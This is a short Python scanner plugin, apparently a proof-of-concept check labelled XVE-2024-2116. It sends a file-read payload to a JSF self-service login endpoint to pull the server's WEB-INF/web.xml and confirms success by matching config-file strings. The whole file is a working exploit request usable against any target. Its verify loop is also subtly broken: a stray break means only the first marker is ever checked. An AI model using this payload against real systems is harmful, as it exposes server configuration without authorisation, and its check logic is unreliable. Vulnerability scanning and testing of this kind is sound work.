from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger
from xing.core import PluginType, SchemeType

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "XVE-2024-2116"
        self.app_name = 'JSP'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]
    
    def verify(self, target):
        
        payload = '/selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F'
        checks = [b'SystemFile', b'ModuleConfigFile' ,b'http://java.sun.com/xml/ns/j2ee' ,b'javax.faces.STATE_SAVING_METHOD']
        self.logger.info("verify {}".format(target))
        
        url = target + payload
        reponse = http_req(url)
        for check in checks:
            if check in reponse.content:
                self.logger.success("found {} {}".format(self.app_name, url))
                return url
            break
